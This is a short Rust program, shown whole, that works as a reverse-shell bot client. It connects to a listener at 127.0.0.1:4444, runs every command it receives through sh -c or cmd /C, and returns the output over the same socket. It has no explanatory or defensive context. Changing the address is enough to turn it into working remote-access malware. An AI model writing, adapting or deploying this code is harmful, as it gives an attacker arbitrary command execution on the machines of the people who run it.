```rust
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    let mut buffer = [0u8; 4096];

    loop {
        let bytes_read = stream.read(&mut buffer)?;
        if bytes_read == 0 {
            // Connection closed by server
            break;
        }

        let command_str = String::from_utf8_lossy(&buffer[..bytes_read])
            .trim()
            .to_string();

        if command_str.is_empty() {
            continue;
        }

        // Allow exit command to terminate the bot
        if command_str == "exit" || command_str == "quit" {
            break;
        }

        // Execute the command using the shell
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(&["/C", &command_str])
                .output()
        } else {
            Command::new("sh")
                .args(&["-c", &command_str])
                .output()
        };

        let response = match output {
            Ok(out) => {
                let mut result = String::new();
                result.push_str(&String::from_utf8_lossy(&out.stdout));
                result.push_str(&String::from_utf8_lossy(&out.stderr));
                if result.is_empty() {
                    result.push_str("[command executed with no output]\n");
                }
                result
            }
            Err(e) => format!("Error executing command: {}\n", e),
        };

        // Send the result back to the server
        stream.write_all(response.as_bytes())?;
        stream.flush()?;
    }

    Ok(())
}
